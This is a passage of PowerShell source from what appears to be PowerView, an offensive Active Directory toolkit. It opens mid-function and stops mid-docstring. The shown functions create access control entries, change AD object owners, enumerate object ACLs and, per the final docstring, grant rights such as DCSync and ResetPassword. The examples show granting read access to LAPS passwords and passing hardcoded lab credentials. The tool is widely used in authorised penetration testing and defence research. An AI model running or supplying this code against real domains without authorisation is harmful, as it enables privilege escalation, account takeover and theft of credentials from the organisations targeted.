bool[] 24\n            for($i=0; $i -lt 3; $i++) {\n                $Byte = $HoursArr[$i]\n                $Offset = $i * 8\n                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')\n\n                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])\n                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])\n                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])\n                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])\n                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])\n                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])\n                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])\n                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])\n            }\n\n            $LogonHours\n        }\n    }\n\n    Process {\n        $Output = @{\n            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]\n            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]\n            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]\n            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]\n            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]\n            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]\n            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]\n        }\n\n        $Output = New-Object PSObject -Property $Output\n        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')\n        $Output\n    }\n}\n\n\nfunction New-ADObjectAccessControlEntry {\n<#\n.SYNOPSIS\n\nCreates a new Active Directory object-specific access control entry.\n\nAuthor: Lee Christensen (@tifkin_)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None\n\n.DESCRIPTION\n\nCreates a new object-specific access control entry (ACE).  The ACE could be \nused for auditing access to an object or controlling access to objects.\n\n.PARAMETER PrincipalIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the domain principal to add for the ACL. Required. Wildcards accepted.\n\n.PARAMETER PrincipalDomain\n\nSpecifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.\n\n.PARAMETER PrincipalSearchBase\n\nThe LDAP source to search through for principals, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.PARAMETER Right\n\nSpecifies the rights set on the Active Directory object.\n\n.PARAMETER AccessControlType\n\nSpecifies the type of ACE (allow or deny)\n\n.PARAMETER AuditFlag\n\nFor audit ACEs, specifies when to create an audit log (on success or failure)\n\n.PARAMETER ObjectType\n\nSpecifies the GUID of the object that the ACE applies to.\n\n.PARAMETER InheritanceType\n\nSpecifies how the ACE applies to the object and/or its children.\n\n.PARAMETER InheritedObjectType\n\nSpecifies the type of object that can inherit the ACE.\n\n.EXAMPLE\n\n$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()\n\nAdds an ACE to all computer objects in the OU \"Workstations\" permitting the\nuser \"itadmin\" to read the confidential ms-Mcs-AdmPwd computer property.\n\n.OUTPUTS\n\nSystem.Security.AccessControl.AuthorizationRule\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.Security.AccessControl.AuthorizationRule')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String]\n        $PrincipalIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $PrincipalDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]\n        $Right,\n\n        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]\n        [ValidateSet('Allow', 'Deny')]\n        [String[]]\n        $AccessControlType,\n\n        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]\n        [ValidateSet('Success', 'Failure')]\n        [String]\n        $AuditFlag,\n\n        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]\n        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]\n        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]\n        [Guid]\n        $ObjectType,\n\n        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]\n        [String]\n        $InheritanceType,\n\n        [Guid]\n        $InheritedObjectType\n    )\n\n    Begin {\n        if ($PrincipalIdentity -notmatch '^S-1-.*') {\n            $PrincipalSearcherArguments = @{\n                'Identity' = $PrincipalIdentity\n                'Properties' = 'distinguishedname,objectsid'\n            }\n            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }\n            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }\n            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }\n            $Principal = Get-DomainObject @PrincipalSearcherArguments\n            if (-not $Principal) {\n                throw \"Unable to resolve principal: $PrincipalIdentity\"\n            }\n            elseif($Principal.Count -gt 1) {\n                throw \"PrincipalIdentity matches multiple AD objects, but only one is allowed\"\n            }\n            $ObjectSid = $Principal.objectsid\n        }\n        else {\n            $ObjectSid = $PrincipalIdentity\n        }\n\n        $ADRight = 0\n        foreach($r in $Right) {\n            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)\n        }\n        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight\n\n        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)\n    }\n\n    Process {\n        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {\n\n            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag\n            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)\n            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType\n            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType\n            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType\n            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType\n            }\n\n        }\n        else {\n\n            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType\n            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)\n            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType\n            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType\n            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType\n            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {\n                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType\n            }\n\n        }\n    }\n}\n\n\nfunction Set-DomainObjectOwner {\n<#\n.SYNOPSIS\n\nModifies the owner for a specified active directory object.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject  \n\n.DESCRIPTION\n\nRetrieves the Active Directory object specified by -Identity by splatting to\nGet-DomainObject, returning the raw searchresult object. Retrieves the raw\ndirectoryentry for the object, and sets the object owner to -OwnerIdentity.\n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nof the AD object to set the owner for.\n\n.PARAMETER OwnerIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nof the owner to set for -Identity.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nSet-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y\n\nSet the owner of 'dfm' in the current domain to 'harmj0y'.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nSet-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred\n\nSet the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String]\n        $Identity,\n\n        [Parameter(Mandatory = $True)]\n        [ValidateNotNullOrEmpty()]\n        [Alias('Owner')]\n        [String]\n        $OwnerIdentity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n\n        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid\n        if ($OwnerSid) {\n            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid\n        }\n        else {\n            Write-Warning \"[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'\"\n        }\n    }\n\n    PROCESS {\n        if ($OwnerIdentityReference) {\n            $SearcherArguments['Raw'] = $True\n            $SearcherArguments['Identity'] = $Identity\n\n            # splat the appropriate arguments to Get-DomainObject\n            $RawObject = Get-DomainObject @SearcherArguments\n\n            ForEach ($Object in $RawObject) {\n                try {\n                    Write-Verbose \"[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'\"\n                    $Entry = $RawObject.GetDirectoryEntry()\n                    $Entry.PsBase.Options.SecurityMasks = 'Owner'\n                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)\n                    $Entry.PsBase.CommitChanges()\n                }\n                catch {\n                    Write-Warning \"[Set-DomainObjectOwner] Error setting owner: $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainObjectAcl {\n<#\n.SYNOPSIS\n\nReturns the ACLs associated with a specific active directory object. By default\nthe DACL for the object(s) is returned, but the SACL can be returned with -Sacl.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  \n\n.PARAMETER Identity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\nWildcards accepted.\n\n.PARAMETER Sacl\n\nSwitch. Return the SACL instead of the DACL for the object (default behavior).\n\n.PARAMETER ResolveGUIDs\n\nSwitch. Resolve GUIDs to their display names.\n\n.PARAMETER RightsFilter\n\nA specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs\n\nGet the ACLs for the matt.admin user in the testlab.local domain and\nresolve relevant GUIDs to their display names.\n\n.EXAMPLE\n\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs\n\nEnumerate the ACL permissions for all OUs in the domain.\n\n.EXAMPLE\n\nGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl\n\nEnumerate the SACLs for all OUs in the domain, resolving GUIDs.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainObjectAcl -Credential $Cred -ResolveGUIDs\n\n.OUTPUTS\n\nPowerView.ACL\n\nCustom PSObject with ACL entries.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ACL')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name')]\n        [String[]]\n        $Identity,\n\n        [Switch]\n        $Sacl,\n\n        [Switch]\n        $ResolveGUIDs,\n\n        [String]\n        [Alias('Rights')]\n        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]\n        $RightsFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{\n            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'\n        }\n\n        if ($PSBoundParameters['Sacl']) {\n            $SearcherArguments['SecurityMasks'] = 'Sacl'\n        }\n        else {\n            $SearcherArguments['SecurityMasks'] = 'Dacl'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $Searcher = Get-DomainSearcher @SearcherArguments\n\n        $DomainGUIDMapArguments = @{}\n        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }\n        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }\n\n        # get a GUID -> name mapping\n        if ($PSBoundParameters['ResolveGUIDs']) {\n            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments\n        }\n    }\n\n    PROCESS {\n        if ($Searcher) {\n            $IdentityFilter = ''\n            $Filter = ''\n            $Identity | Where-Object {$_} | ForEach-Object {\n                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')\n                if ($IdentityInstance -match '^S-1-.*') {\n                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"\n                }\n                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {\n                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"\n                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {\n                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname\n                        #   and rebuild the domain searcher\n                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                        Write-Verbose \"[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"\n                        $SearcherArguments['Domain'] = $IdentityDomain\n                        $Searcher = Get-DomainSearcher @SearcherArguments\n                        if (-not $Searcher) {\n                            Write-Warning \"[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'\"\n                        }\n                    }\n                }\n                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {\n                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''\n                    $IdentityFilter += \"(objectguid=$GuidByteString)\"\n                }\n                elseif ($IdentityInstance.Contains('.')) {\n                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))\"\n                }\n                else {\n                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))\"\n                }\n            }\n            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {\n                $Filter += \"(|$IdentityFilter)\"\n            }\n\n            if ($PSBoundParameters['LDAPFilter']) {\n                Write-Verbose \"[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter\"\n                $Filter += \"$LDAPFilter\"\n            }\n\n            if ($Filter) {\n                $Searcher.filter = \"(&$Filter)\"\n            }\n            Write-Verbose \"[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)\"\n\n            $Results = $Searcher.FindAll()\n            $Results | Where-Object {$_} | ForEach-Object {\n                $Object = $_.Properties\n\n                if ($Object.objectsid -and $Object.objectsid[0]) {\n                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value\n                }\n                else {\n                    $ObjectSid = $Null\n                }\n\n                try {\n                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {\n                        if ($PSBoundParameters['RightsFilter']) {\n                            $GuidFilter = Switch ($RightsFilter) {\n                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }\n                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }\n                                Default { '00000000-0000-0000-0000-000000000000' }\n                            }\n                            if ($_.ObjectType -eq $GuidFilter) {\n                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]\n                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid\n                                $Continue = $True\n                            }\n                        }\n                        else {\n                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]\n                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid\n                            $Continue = $True\n                        }\n\n                        if ($Continue) {\n                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))\n                            if ($GUIDs) {\n                                # if we're resolving GUIDs, map them them to the resolved hash table\n                                $AclProperties = @{}\n                                $_.psobject.properties | ForEach-Object {\n                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {\n                                        try {\n                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]\n                                        }\n                                        catch {\n                                            $AclProperties[$_.Name] = $_.Value\n                                        }\n                                    }\n                                    else {\n                                        $AclProperties[$_.Name] = $_.Value\n                                    }\n                                }\n                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties\n                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')\n                                $OutObject\n                            }\n                            else {\n                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')\n                                $_\n                            }\n                        }\n                    }\n                }\n                catch {\n                    Write-Verbose \"[Get-DomainObjectAcl] Error: $_\"\n                }\n            }\n        }\n    }\n}\n\n\nfunction Add-DomainObjectAcl {\n<#\n.SYNOPSIS\n\nAdds an ACL for a specific active directory object.\n\nAdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainObject  \n\n.DESCRIPTION\n\nThis function modifies the ACL/ACE entries for a given Active Directory\ntarget object specified by -TargetIdentity. Available -Rights are\n'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended\nrights GUID can be set with -RightsGUID. These rights are granted on the target\nobject for the specified -PrincipalIdentity.\n\n.PARAMETER TargetIdentity\n\nA SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\nSID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\nfor the domain object to modify ACLs for. Required. Wildcards accepted.\n\n.PARAMETER TargetDomain\n\nSpecifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.\n\n.PARAMETER 